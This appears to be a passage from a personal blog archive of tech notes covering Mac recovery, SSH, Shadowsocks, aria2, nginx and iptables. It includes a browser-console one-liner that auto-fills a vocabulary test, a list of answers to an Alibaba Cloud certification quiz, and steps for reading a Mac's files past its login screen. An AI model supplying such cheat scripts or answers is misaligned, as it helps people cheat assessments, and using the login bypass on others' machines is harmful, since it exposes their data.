    <content><![CDATA[<p><strong>problem 1</strong>: stuck at &quot;partition disk&quot;.</p>
<p><strong>solution</strong>: </p>
<ol>
<li><p>force quit boot camp</p>
</li>
<li><p>then open disk utility.</p>
</li>
<li><p>click partition, delete all other partition (using the - symbol)that bootcamp made. including: <em>OSXRECOVER</em> and <em>BOOTCAMP</em>.</p>
</li>
<li><p>open bootcamp again and try re-install again.</p>
</li>
</ol>
<hr>
<p><strong>problem 2</strong>: An error occurred while copying the Windows installation files</p>
<p><strong>reason</strong>:  because bootcamp using a 8g FAT32 disk partition to copy windows file, since FAT32 can not support file larger than 4g. any windows file larger than 4g will cause this problem happen.</p>
<p><strong>solution</strong>: </p>
<ol>
<li>use a ISO that have file size smaller than 4g.</li>
<li>known iso that can not use: 1703 1803 1809 (may work on your computer)</li>
<li>known iso that can use: none</li>
</ol>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
      <tags>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>Use single-user-mode to access files from a mac without login</title>
    <url>/articles/blogarchive/2019-05-26-18-23-29/</url>
    <content><![CDATA[<p>On May 23, 2019. I accidentally drop my MacBook, which looses the connection between the motherboard and hard drive. After I reconnect the SATA cable and restart my computer, I found that my laptop stuck after I enter the login password.</p>
<p>##First try:<br>In recovery mode, reset the password.</p>
<p>See instruction at:</p>
<p> <a href="https://www.macworld.co.uk/how-to/mac/forgotten-mac-password-3594395/">https://www.macworld.co.uk/how-to/mac/forgotten-mac-password-3594395/</a> </p>
<p>or <a href="https://support.apple.com/en-hk/HT202860">https://support.apple.com/en-hk/HT202860</a> </p>
<p>or <a href="https://jingyan.baidu.com/article/6f2f55a163030bb5b83e6c71.html">https://jingyan.baidu.com/article/6f2f55a163030bb5b83e6c71.html</a></p>
<p>However, I failed.</p>
<hr>
<p>##Second try:<br>I first try to set up a new user by using single user mode.</p>
<p>See instruction here: <a href="https://zhidao.baidu.com/question/528962469.html">https://zhidao.baidu.com/question/528962469.html</a></p>
<p>However, after I set up the new user, I still got stuck when I try to login into the system.</p>
<hr>
<p>##My solution<br>Since I have a Time Machine backup in January, I can recover my computer using Time Machine. However, I still need to backup some important information that is not in the Time machine. After doing some research, I successfully copy the important file from MacBook using single user mode.</p>
<p>###Copy file without login:</p>
<p>If your mac running a macos <strong>higher</strong> than <strong>El Capitan</strong>, you should first remove “System Integrity Protection” before entering the single user mode. </p>
<ol>
<li><p>Reboot your mac and press <strong>command + R</strong>, go to the recovery mode.<br><img data-src="https://i.loli.net/2019/05/26/5cea6dd3daa9635980.jpg" alt="IMG_2017.jpg"></p>
</li>
<li><p>Click on the <strong>&quot;Utilities&quot;</strong> menu, and then click on <strong>&quot;Terminal&quot;</strong> to open terminal.<br><img data-src="https://i.loli.net/2019/05/26/5cea6dd49a4e434697.jpg" alt="IMG_2018.jpg"></p>
</li>
<li><p>In the terminal type <code>csrutil disable</code> and enter.<br><img data-src="https://i.loli.net/2019/05/26/5cea6dd49681d76042.jpg" alt="IMG_2021.jpg"></p>
</li>
</ol>
<hr>
<p>If your mac running a macos lower than El Capitain, ignore the step above.</p>
<ol>
<li><p>reboot again, but this time press <strong>command + S</strong> to enter single user mode.</p>
</li>
<li><p>Follow the instruction, type <code>/sbin/fsck -fy</code> and press enter (if this command <em>does not</em> show “The volume xxx appears to be OK”, you should run this command multiple time until it shows this message)<br><img data-src="https://i.loli.net/2019/05/26/5cea6dd3a0dcf39109.jpg" alt="IMG_2040.jpg"></p>
</li>
<li><p>type <code>mount -uw /</code> and press enter<br><img data-src="https://i.loli.net/2019/05/26/5cea6dd356d6b39933.jpg" alt="IMG_2041.jpg"></p>
</li>
<li><p>type <code>mkdir /Volumes/usb</code> to create a directory for external storage device (using later).<br> <img data-src="https://i.loli.net/2019/05/26/5cea6dd296cc070560.jpg" alt="IMG_2050.jpg"></p>
</li>
<li><p>type <code>ls /dev/disk*</code> to show current disks.</p>
</li>
<li><p>plug in an external storage device (USB or other things), type <code>ls /dev/disk*</code> to find which is the external storage device (often the last one in the list).<br><img data-src="https://i.loli.net/2019/05/26/5cea6dd31862143880.jpg" alt="IMG_2042.jpg"><br><img data-src="https://i.loli.net/2019/05/26/5cea6dd35043d68794.jpg" alt="IMG_2045.jpg"></p>
</li>
<li><p>type <code>fstyp /dev/disk1s3</code> (depends on which disk you are using) to find the system of the disk, (Interest things is that although my drive is exfat, the fstyp shows msdos).<br><img data-src="https://i.loli.net/2019/05/26/5cea6dd2e563632749.jpg" alt="IMG_2048.jpg"></p>
</li>
<li><p>according to 7, type <code>/sbin/mount_exfat /dev/disk1s3 /Volumes/usb</code> to load storage device. Depending on your file system, you may choose a different command. For example, if your device is using msdos file system, you should type <code>/sbin/mount_msdos</code> instead of <code>/sbin/mount_exfat</code>. You can see all the supported file system by entering <code>ls /sbin/mount_*</code><br><img data-src="https://i.loli.net/2019/05/26/5cea6ff5b939a68066.jpg" alt="IMG_2052.jpg"></p>
</li>
<li><p>if the external storage is loaded success, you can now access your external drive. Type <code>ls /Volumes/usb</code> to find out.<br><img data-src="https://i.loli.net/2019/05/26/5cea6ff5b36f716934.jpg" alt="IMG_2053.jpg"></p>
</li>
<li><p>Copy file to your device by using command <strong>cp</strong>. Eg: <code>cp /User/xxx/Desktop/1.jpg /Volumes/usb</code><br><img data-src="https://i.loli.net/2019/05/26/5cea6ff56653544452.jpg" alt="IMG_2055.jpg"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>macos</tag>
        <tag>tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>Add tag system</title>
    <url>/articles/blogarchive/2019-05-20-10-08-26/</url>
    <content><![CDATA[<p>In May 20, 2019. I add a tag system into the blog.</p>
<p>To use the tag, click add article or edit article, in the edit page, you will see  a new tag input.</p>
<p>type tags into the input and split them with space</p>
<p>e.g &quot;mysql python&quot; means two tag: mysql and python.</p>
<p>click submit to finish.</p>
]]></content>
      <categories>
        <category>SiteDev</category>
      </categories>
  </entry>
  <entry>
    <title>Landwave Word Test Cracking</title>
    <url>/articles/blogarchive/2019-07-22-14-37-59/</url>
    <content><![CDATA[<h2 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h2><p>This method can only be used for learning purpose.</p>
<p>For you own TOEFL learning concern, be sure to use it correctly and wisely.</p>
<p>Do not use this method to cheat in the word test unless your landwave instructor allow you to do so.</p>
<p>I am not responsible for any of the abusing usage.</p>
<hr>
<h3 id="Firstly-open-the-console"><a href="#Firstly-open-the-console" class="headerlink" title="Firstly, open the console"></a>Firstly, open the console</h3><p><a href="https://i.loli.net/2019/07/22/5d3556aea999c28771.png"><img data-src="https://i.loli.net/2019/07/22/5d3556aea999c28771.png" alt="3"></a></p>
<h3 id="Then-copy-and-paste-the-code-below"><a href="#Then-copy-and-paste-the-code-below" class="headerlink" title="Then, copy and paste the code below."></a>Then, copy and paste the code below.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(&quot;.textstyle6.StyleW10&quot;).each(function(index,e)&#123;$(this).val(allwords[index]._chineseWord)&#125;);</span><br></pre></td></tr></table></figure>
<p><a href="https://i.loli.net/2019/07/22/5d3556aec4dac78459.png"><img data-src="https://i.loli.net/2019/07/22/5d3556aec4dac78459.png" alt="4"></a></p>
<p>###Finally, press enter. </p>
<p><a href="https://i.loli.net/2019/07/22/5d3556aecf62582025.png"><img data-src="https://i.loli.net/2019/07/22/5d3556aecf62582025.png" alt="5"></a></p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>toefl</tag>
        <tag>crack</tag>
        <tag>landwave</tag>
      </tags>
  </entry>
  <entry>
    <title>Shadowsocks problem with config file</title>
    <url>/articles/blogarchive/2019-09-03-13-45-23/</url>
    <content><![CDATA[<p>In the default shadowsocks config file, the server ip is 127.0.0.1</p>
<pre>
#config file example
{
    "server":["::1", "127.0.0.1"],
    "mode":"tcp_and_udp",
    "server_port":PORT,
    "local_port":1080,
    "password":"password",
    "timeout":60,
    "method":"chacha20-ietf-poly1305"
}
</pre>

<p>However, 127.0.0.1 only allow the local connection, so you can&#39;t connect to the server from client.</p>
<p>Therefore, to fix this problem, you should change the ip 127.0.0.1 into 0.0.0.0</p>
<pre>
#config file example
{
    "server":["::1", "0.0.0.0"],
    "mode":"tcp_and_udp",
    "server_port":PORT,
    "local_port":1080,
    "password":"password",
    "timeout":60,
    "method":"chacha20-ietf-poly1305"
}
</pre>

<p>Restart the ss-server, you can now connect to your shadowsocks server successfully.</p>
]]></content>
      <categories>
        <category>Developing</category>
      </categories>
      <tags>
        <tag>tutorial</tag>
        <tag>shadowsocks</tag>
        <tag>solution</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云白嫖</title>
    <url>/articles/blogarchive/2019-09-03-20-18-17/</url>
    <content><![CDATA[<p>从群里看见的</p>
<p>大概能拿200代金券</p>
<p>地址: <a href="https://developer.aliyun.com/certification?inviteCode=pifgful6xp346">https://developer.aliyun.com/certification?inviteCode=pifgful6xp346</a></p>
<p>选java高级测试</p>
<p>答案:</p>
<p>下面关于数组排序的说明哪项是错误的？<br>Comparator接口中提供有compare（）方法实现数组的排序操作</p>
<p>使用Runtime类的gc（）方法，可以释放垃圾内存</p>
<p>object类中的getclass（）方法不能被覆写</p>
<p>synchronized关键字常用来为对象加锁，从而使得对对象的访问是排他的</p>
<p>serializable接口无法实现多线程子类定义</p>
<p>如果要实现多线程编程下面哪项描述是错误的？<br>多线程处理类可以继承Synchronized类，同时覆写run（）方法如果要为对象回收做收尾操作，应该覆写objectt类中的finalize（）方法</p>
<p>当执行“Math.round（-15.61）&quot;程序后的计算结果是哪个？<br>-16</p>
<p>public string tostring（）<br>不是object类所提供的线程操作方法</p>
<p>下列关于Date描述错误的一项<br>直接输出Date类对象就可以取得日期时间数据，但是取得的月数是从0开始计算的</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>aliyun</tag>
        <tag>白嫖</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次阿里云学生服务器白嫖</title>
    <url>/articles/blogarchive/2019-09-03-20-51-24/</url>
    <content><![CDATA[<h3 id="购买服务器-白嫖"><a href="#购买服务器-白嫖" class="headerlink" title="购买服务器 (白嫖)"></a>购买服务器 (白嫖)</h3><hr>
<p>首先，打开白嫖连接: <a href="https://promotion.aliyun.com/ntms/act/campus2018.html">https://promotion.aliyun.com/ntms/act/campus2018.html</a></p>
<p>购买一个服务器，云服务器EMC和轻量应用服务器都行，购买完成后进入管理界面</p>
<span id="more"></span>

<p><img data-src="https://i.loli.net/2019/09/03/hgd3LOTRyqDWluN.png" alt="1.png"></p>
<h3 id="设置ssh连接"><a href="#设置ssh连接" class="headerlink" title="设置ssh连接"></a>设置ssh连接</h3><hr>
<ol>
<li>进入服务器运维-远程连接。</li>
<li>设置密码, 设置一个服务器密码。<br><img data-src="https://i.loli.net/2019/09/03/guaXENAjPkxsGVm.png" alt="D223E1E8-AD8E-46DB-B505-9AEFC7274AD1.png"></li>
<li>检查服务器是否允许用密码登陆ssh</li>
<li>点击 使用浏览器发起安全连接（推荐）<br><img data-src="https://i.loli.net/2019/09/03/nQyRkcB1WMrKfp4.png" alt="9153CC24-DE77-45B8-B92F-A66FFB5DF064.png"></li>
<li><code>sudo nano /etc/ssh/sshd_config</code> 进入配置文件</li>
<li>改 <code>/etc/ssh/sshd_config </code> 文件中的<code>PasswordAuthentication no</code>改为<code>PasswordAuthentication yes</code>并保存<br><img data-src="https://i.loli.net/2019/09/03/o1gSpWdxmbchkDt.png" alt="4BF7B8D5-70D6-4133-ABD9-AD605A684456.png"></li>
<li>重启sshd服务<code>sudo systemctl restart sshd.service</code></li>
</ol>
<h3 id="测试ssh连接"><a href="#测试ssh连接" class="headerlink" title="测试ssh连接"></a>测试ssh连接</h3><hr>
<ol>
<li>在 服务器运维-远程连接 中找到连接ip<br><img data-src="https://i.loli.net/2019/09/03/d9uIcLsJxmNHDF8.png" alt="E4930553-853D-4403-9529-EAB84D8FA7F0.png"></li>
<li>客户端中测试连接<br><img data-src="https://i.loli.net/2019/09/03/TnYGO9QFCdulEBr.png" alt="22F9B590-D826-4DE0-BBEA-3FDE18566A5B.png"></li>
<li>完成<del>撒花</del>ε&#x3D;&#x3D;(づ′▽&#96;)づ<br><img data-src="https://i.loli.net/2019/09/03/QEhJtPYWDSMwcuk.png" alt="12331145-394B-48BB-9588-32AEE510BB73.png"></li>
</ol>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>aliyun</tag>
        <tag>白嫖</tag>
      </tags>
  </entry>
  <entry>
    <title>Aria2 在 Macos上的安装</title>
    <url>/articles/blogarchive/2019-09-03-20-59-14/</url>
    <content><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><hr>
<ol>
<li>安装aria2 <code>brew install aria2</code></li>
<li>创建配置文件 aria2.conf， 保存到任意位置.</li>
</ol>
<span id="more"></span>

<pre>
#用户名
#rpc-user=xxxx
#密码
#rpc-passwd=xxxx
#上面的认证方式不建议使用,建议使用下面的token方式
#设置加密的密钥
rpc-secret=takethisL
#允许rpc
enable-rpc=true
#允许所有来源, web界面跨域权限需要
rpc-allow-origin-all=true
#允许外部访问，false的话只监听本地端口
rpc-listen-all=false
#RPC端口, 仅当默认端口被占用时修改
#rpc-listen-port=6800
#最大同时下载数(任务数), 路由建议值: 3
max-concurrent-downloads=5
#断点续传
continue=true
#同服务器连接数
max-connection-per-server=5
#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要
min-split-size=10M
#单文件最大线程数, 路由建议值: 5
split=10
#下载速度限制
max-overall-download-limit=0
#单文件速度限制
max-download-limit=0
#上传速度限制
max-overall-upload-limit=0
#单文件速度限制
max-upload-limit=0
#断开速度过慢的连接
#lowest-speed-limit=0
#验证用，需要1.16.1之后的release版本
#referer=*
#文件保存路径, 默认为当前启动位置
dir=xxx/xxx/xxx
#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本
#disk-cache=0
#另一种Linux文件缓存方式, 使用前确保您使用的内核支持此选项, 需要1.15及以上版本(?)
#enable-mmap=true
#文件预分配, 能有效降低文件碎片, 提高磁盘性能. 缺点是预分配时间较长
#所需时间none &#60; falloc. trunc &#60; prealloc, falloc和trunc需要文件系统和内核支持
file-allocation=prealloc
</pre>

<h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><hr>
<ol>
<li>创建 <code>start.sh</code> (--conf-path 自行替换成你保存的配置文件的位置)<br><code>aria2c --conf-path=&quot;/xxx/Aria2/aria2.conf&quot;</code></li>
<li>添加可执行权限<br><code>chmod +x /xxx/Aria2/aria2.conf</code></li>
<li>启动<br><code>bash /xxx/Aria2/aria2.conf</code></li>
</ol>
<p>或者直接<code>aria2c --conf-path=&quot;/xxx/Aria2/aria2.conf</code></p>
<p>###Extra：windows安装教程</p>
<hr>
<p>详见: <a href="https://www.moerats.com/archives/519/">https://www.moerats.com/archives/519/</a></p>
]]></content>
      <categories>
        <category>系统默认</category>
      </categories>
      <tags>
        <tag>macos</tag>
        <tag>aria2</tag>
      </tags>
  </entry>
  <entry>
    <title>Fix bug with Chinese input in tags system (中文标签问题)</title>
    <url>/articles/blogarchive/2019-09-03-22-22-55/</url>
    <content><![CDATA[<p>Tags system not work properly with Chinese character.</p>
<p>The bug is fixed now.</p>
<p>The problem is caused by the url encoding.</p>
<p>To fix the bug, we could decode the url into Chinese again.</p>
<p>Solution below</p>
<pre>
import urllib
tag = urllib.parse.unquote(url)
</pre>]]></content>
      <categories>
        <category>SiteDev</category>
      </categories>
      <tags>
        <tag>debug</tag>
      </tags>
  </entry>
  <entry>
    <title>New Best Toefl Score 2019 Aug</title>
    <url>/articles/blogarchive/2019-09-04-08-30-23/</url>
    <content><![CDATA[<p><img data-src="https://i.loli.net/2019/09/05/MZ9cxheQ3jJ5PEG.png" alt="4087FDA874E59871EAACAEC74B194535.png"></p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>toefl</tag>
      </tags>
  </entry>
  <entry>
    <title>How to change ssh port or add ssh port</title>
    <url>/articles/blogarchive/2019-09-04-14-19-40/</url>
    <content><![CDATA[<h3 id="Adding-ports"><a href="#Adding-ports" class="headerlink" title="Adding ports"></a>Adding ports</h3><ol>
<li>make sure you have ssh service installed properly.</li>
<li>sudo nano &#x2F;etc&#x2F;ssh&#x2F;sshd_config to edit the config file</li>
<li>add new port by adding new line of &quot;Port 2222&quot; (in this case, 2222 is your new ssh port)<br><img data-src="https://i.loli.net/2019/09/04/Gt216fFeRrCvj9I.png" alt="29917F88-7D25-417A-B5C0-17D497D0C221.png"></li>
<li>restart ssh service by using &quot;sudo systemctl restart sshd.service&quot;</li>
</ol>
<span id="more"></span>

<hr>
<h3 id="Set-new-firewall-rule"><a href="#Set-new-firewall-rule" class="headerlink" title="Set new firewall rule"></a>Set new firewall rule</h3><ol>
<li>Go to aliyun console.</li>
<li>Go to firewall setting and press new rule. 进入安全-防火墙，点击添加规则<br><img data-src="https://i.loli.net/2019/09/04/cEjxnfQTJ4uUBAd.png" alt="1"></li>
<li>Add a new rule for 2222. 添加自定义规则，Tcp，端口号 (本例中是2222) 你可以自行替换<br><img data-src="https://i.loli.net/2019/09/04/1uMqxkYKvm3FPiN.png" alt="2"></li>
</ol>
<hr>
<h3 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h3><ol>
<li>ssh username@youip -p 2222</li>
<li>success~<br><img data-src="https://i.loli.net/2019/09/04/ZwxHVLobiaTBz27.png" alt="4FEAF6A4-1755-4587-8E33-87F88C3DA09B.png"></li>
</ol>
]]></content>
      <categories>
        <category>Developing</category>
      </categories>
      <tags>
        <tag>aliyun</tag>
        <tag>ssh</tag>
        <tag>server</tag>
      </tags>
  </entry>
  <entry>
    <title>utf-8 乱码表</title>
    <url>/articles/blogarchive/2019-09-06-10-34-25/</url>
    <content><![CDATA[<p><img data-src="/images/20201124847.png" alt="utf 乱码表"></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
  </entry>
  <entry>
    <title>add cdn for live2d models</title>
    <url>/articles/blogarchive/2019-09-16-22-32-00/</url>
    <content><![CDATA[<p>add cdn for live2d models</p>
<p>now you can load live2d model faster.</p>
]]></content>
      <categories>
        <category>SiteDev</category>
      </categories>
  </entry>
  <entry>
    <title>Using Nginx as a static file server</title>
    <url>/articles/blogarchive/2019-09-06-09-13-22/</url>
    <content><![CDATA[<h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><ol>
<li>apt install nginx</li>
</ol>
<hr>
<h3 id="Config"><a href="#Config" class="headerlink" title="Config"></a>Config</h3><ol>
<li>sudo nano &#x2F;etc&#x2F;nginx&#x2F;nginx.conf, in the file, add <em>include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</em> in http. If the config file already have this line, ignore this step.</li>
</ol>
<span id="more"></span>

<pre>
http{

         include /etc/nginx/conf.d/*.conf;

}
</pre>

<ol start="2">
<li><p>make a directory under <em>&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;</em> using<br> &quot;mkdir &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;yourconfigname.conf&quot;</p>
</li>
<li><p>edit the config file you just made.</p>
</li>
</ol>
<pre>
server {

        listen       80;

        server_name  xxx.com;

        location / {

            root   /home/filestation;

            autoindex on;

        }

}

</pre>



<hr>
<p>listen: the port of nginx server</p>
<p>server_name: your domain, for example: myserver.com</p>
<p>location: the http entry point</p>
<p>root: the real file route.</p>
<p>For example: if you set <strong>location &#x2F;</strong> and <strong>root &#x2F;home&#x2F;filestation</strong>, you can access your <strong>&#x2F;home&#x2F;filestation&#x2F;myfile.txt</strong> at <strong>myserver.com&#x2F;myfile.txt</strong> </p>
<p>if you set <strong>location &#x2F;abc</strong> and <strong>root &#x2F;home&#x2F;filestation</strong>, you can access your <strong>&#x2F;home&#x2F;filestation&#x2F;abc&#x2F;myfile.txt</strong> at <strong>myserver.com&#x2F;abc&#x2F;myfile.txt</strong></p>
<p>autoindex: if you can access to the directory. (on&#x2F;off)</p>
<p><img data-src="https://s1.lxgshadow.us:8080/imgs/37490adbe9a92247c458c29fd4e9acfa.png" alt="img"></p>
<hr>
<h3 id="restart"><a href="#restart" class="headerlink" title="restart"></a>restart</h3><ol>
<li>sudo service nginx restart.</li>
</ol>
]]></content>
      <categories>
        <category>Developing</category>
      </categories>
      <tags>
        <tag>server</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>【转载】iptables 详解</title>
    <url>/articles/blogarchive/2019-09-23-10-11-50/</url>
    <content><![CDATA[<h2 id="转载iptable-原理"><a href="#转载iptable-原理" class="headerlink" title="转载iptable 原理"></a>转载iptable 原理</h2><p>原文集: <a href="https://www.zsythink.net/wp-content/themes/begin/inc/go.php?url=http://www.zsythink.net/archives/tag/iptables/">iptables</a></p>
<h1 id="iptables详解（1）：iptables概念"><a href="#iptables详解（1）：iptables概念" class="headerlink" title="iptables详解（1）：iptables概念"></a>iptables详解（1）：iptables概念</h1><h2 id="防火墙相关概念"><a href="#防火墙相关概念" class="headerlink" title="防火墙相关概念"></a>防火墙相关概念</h2><p>此处先描述一些相关概念。</p>
<p>从逻辑上讲。防火墙可以大体分为主机防火墙和网络防火墙。</p>
<p>主机防火墙：针对于单个主机进行防护。</p>
<p>网络防火墙：往往处于网络入口或边缘，针对于网络入口进行防护，服务于防火墙背后的本地局域网。</p>
<p>网络防火墙和主机防火墙并不冲突，可以理解为，网络防火墙主外（集体）， 主机防火墙主内（个人）。</p>
<p>从物理上讲，防火墙可以分为硬件防火墙和软件防火墙。</p>
<p>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。</p>
<p>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低。</p>
<p>那么在此处，我们就来聊聊Linux的iptables</p>
<span id="more"></span>

<p><strong>iptables</strong>其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的&quot;安全框架&quot;中，这个&quot;安全框架&quot;才是真正的防火墙，这个框架的名字叫<strong>netfilter</strong></p>
<p>netfilter才是防火墙真正的安全框架（framework），netfilter位于内核空间。</p>
<p>iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。</p>
<p>netfilter&#x2F;iptables（下文中简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。</p>
<p>Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：</p>
<p>网络地址转换(Network Address Translate)</p>
<p>数据包内容修改</p>
<p>以及数据包过滤的防火墙功能</p>
<p>所以说，虽然我们使用service iptables start启动iptables&quot;服务&quot;，但是其实准确的来说，iptables并没有一个守护进程，所以并不能算是真正意义上的服务，而应该算是内核提供的功能。</p>
<h2 id="iptables基础"><a href="#iptables基础" class="headerlink" title="iptables基础"></a>iptables基础</h2><p>我们知道iptables是按照规则来办事的，我们就来说说规则（rules），规则其实就是网络管理员预定义的条件，规则一般的定义为&quot;如果数据包头符合这样的条件，就这样处理这个数据包&quot;。规则存储在内核空间的信息包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的主要工作就是添加、修改和删除这些规则。</p>
<p>这样说可能并不容易理解，我们来换个容易理解的角度，从头说起.</p>
<p>当客户端访问服务器的web服务时，客户端发送报文到网卡，而tcp&#x2F;ip协议栈是属于内核的一部分，所以，客户端的信息会通过内核的TCP协议传输到用户空间中的web服务中，而此时，客户端报文的目标终点为web服务所监听的套接字（IP：Port）上，当web服务需要响应客户端请求时，web服务发出的响应报文的目标终点则为客户端，这个时候，web服务所监听的IP与端口反而变成了原点，我们说过，netfilter才是真正的防火墙，它是内核的一部分，所以，如果我们想要防火墙能够达到&quot;防火&quot;的目的，则需要在内核中设置关卡，所有进出的报文都要通过这些关卡，经过检查后，符合放行条件的才能放行，符合阻拦条件的则需要被阻止，于是，就出现了input关卡和output关卡，而这些关卡在iptables中不被称为&quot;关卡&quot;,而被称为&quot;链&quot;。</p>
<p><img data-src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_1.png" alt="iptables详解（1）：iptables概念"></p>
<p>   
 </p>
<p>其实我们上面描述的场景并不完善，因为客户端发来的报文访问的目标地址可能并不是本机，而是其他服务器，当本机的内核支持IP_FORWARD时，我们可以将报文转发给其他服务器，所以，这个时候，我们就会提到iptables中的其他&quot;关卡&quot;，也就是其他&quot;链&quot;，他们就是  &quot;路由前&quot;、&quot;转发&quot;、&quot;路由后&quot;，他们的英文名是</p>
<p>PREROUTING、FORWARD、POSTROUTING</p>
<p>也就是说，当我们启用了防火墙功能时，报文需要经过如下关卡，也就是说，根据实际情况的不同，报文经过&quot;链&quot;可能不同。如果报文需要转发，那么报文则不会经过input链发往用户空间，而是直接在内核空间中经过forward链和postrouting链转发出去的。</p>
<p><img data-src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_2.png" alt="iptables详解（1）：iptables概念"></p>
<p>所以，根据上图，我们能够想象出某些常用场景中，报文的流向：</p>
<p>到本机某进程的报文：PREROUTING --&gt; INPUT</p>
<p>由本机转发的报文：PREROUTING --&gt; FORWARD --&gt; POSTROUTING</p>
<p>由本机的某进程发出报文（通常为响应报文）：OUTPUT --&gt; POSTROUTING</p>
<p>   
 </p>
<p>链的概念  </p>
<hr>
<p>现在，我们想象一下，这些&quot;关卡&quot;在iptables中为什么被称作&quot;链&quot;呢？我们知道，防火墙的作用就在于对经过的报文匹配&quot;规则&quot;，然后执行对应的&quot;动作&quot;,所以，当报文经过这些关卡的时候，则必须匹配这个关卡上的规则，但是，这个关卡上可能不止有一条规则，而是有很多条规则，当我们把这些规则串到一个链条上的时候，就形成了&quot;链&quot;,所以，我们把每一个&quot;关卡&quot;想象成如下图中的模样  ，这样来说，把他们称为&quot;链&quot;更为合适，每个经过这个&quot;关卡&quot;的报文，都要将这条&quot;链&quot;上的所有规则匹配一遍，如果有符合条件的规则，则执行规则对应的动作。</p>
<p><img data-src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_3.png" alt="iptables详解（1）：iptables概念"></p>
<p>   
 </p>
<h2 id="表的概念"><a href="#表的概念" class="headerlink" title="表的概念"></a>表的概念</h2><p>我们再想想另外一个问题，我们对每个&quot;链&quot;上都放置了一串规则，但是这些规则有些很相似，比如，A类规则都是对IP或者端口的过滤，B类规则是修改报文，那么这个时候，我们是不是能把实现相同功能的规则放在一起呢，必须能的。</p>
<p>我们把具有相同功能的规则的集合叫做&quot;表&quot;，所以说，不同功能的规则，我们可以放置在不同的表中进行管理，而iptables已经为我们定义了4种表，每种表对应了不同的功能，而我们定义的规则也都逃脱不了这4种功能的范围，所以，学习iptables之前，我们必须先搞明白每种表 的作用。</p>
<p>iptables为我们提供了如下规则的分类，或者说，iptables为我们提供了如下&quot;表&quot;</p>
<p>filter表：负责过滤功能，防火墙；内核模块：iptables_filter</p>
<p>nat表：network address translation，网络地址转换功能；内核模块：iptable_nat</p>
<p>mangle表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle</p>
<p>raw表：关闭nat表上启用的连接追踪机制；iptable_raw</p>
<p>也就是说，我们自定义的所有规则，都是这四种分类中的规则，或者说，所有规则都存在于这4张&quot;表&quot;中。</p>
<p>   
 </p>
<h2 id="表链关系"><a href="#表链关系" class="headerlink" title="表链关系"></a>表链关系</h2><p>但是我们需要注意的是，某些&quot;链&quot;中注定不会包含&quot;某类规则&quot;，就像某些&quot;关卡&quot;天生就不具备某些功能一样，比如，A&quot;关卡&quot;只负责打击陆地敌人，没有防空能力，B&quot;关卡&quot;只负责打击空中敌人，没有防御步兵的能力，C&quot;关卡&quot;可能比较NB，既能防空，也能防御陆地敌人，D&quot;关卡&quot;最屌，海陆空都能防。</p>
<p>那让我们来看看，每个&quot;关卡&quot;都有哪些能力，或者说，让我们看看每个&quot;链&quot;上的规则都存在于哪些&quot;表&quot;中。</p>
<p>我们还是以图为例，先看看prerouting&quot;链&quot;上的规则都存在于哪些表中。</p>
<p>注意：下图只用于说明prerouting链上的规则存在于哪些表中，并没有描述表的顺序。</p>
<p>   
 </p>
<p><img data-src="http://www.zsythink.net/wp-content/uploads/2017/02/021217_0051_4.png" alt="iptables详解（1）：iptables概念"></p>
<p>这幅图是什么意思呢？它的意思是说，prerouting&quot;链&quot;只拥有nat表、raw表和mangle表所对应的功能，所以，prerouting中的规则只能存放于nat表、raw表和mangle表中。</p>
<p>那么，根据上述思路，我们来总结一下，每个&quot;关卡&quot;都拥有什么功能，</p>
<p>或者说，每个&quot;链&quot;中的规则都存在于哪些&quot;表&quot;中。</p>
<p>PREROUTING      的规则可以存在于：raw表，mangle表，nat表。</p>
<p>INPUT          的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。</p>
<p>FORWARD         的规则可以存在于：mangle表，filter表。</p>
<p>OUTPUT         的规则可以存在于：raw表mangle表，nat表，filter表。</p>
<p>POSTROUTING      的规则可以存在于：mangle表，nat表。</p>
